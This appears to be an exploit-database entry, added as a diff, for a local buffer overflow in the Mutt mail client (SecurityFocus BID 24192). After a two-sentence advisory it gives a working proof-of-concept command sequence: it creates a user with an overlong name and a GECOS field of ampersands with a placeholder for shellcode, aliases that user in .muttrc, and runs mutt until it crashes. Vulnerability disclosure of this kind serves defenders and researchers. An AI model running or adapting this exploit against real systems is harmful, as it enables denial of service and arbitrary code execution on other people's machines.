@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/24192/info
+
+Mutt is prone to a local buffer-overflow vulnerability because it fails to properly bounds-check user-supplied input before using it in a memory copy operation.
+
+An attacker can exploit this issue to execute arbitrary code with the with the privileges of the victim. Failed exploit attempts will result in a denial of service.
+
+# USERNAME=$(perl -e 'print "a" x 31')
+# useradd -c '&&&&&&&&& your-favourite-ascii-shellcode-here' $USERNAME
+# echo alias billg $USERNAME >~/.muttrc
+# mutt billg
+# Segmentation fault (core dumped) 
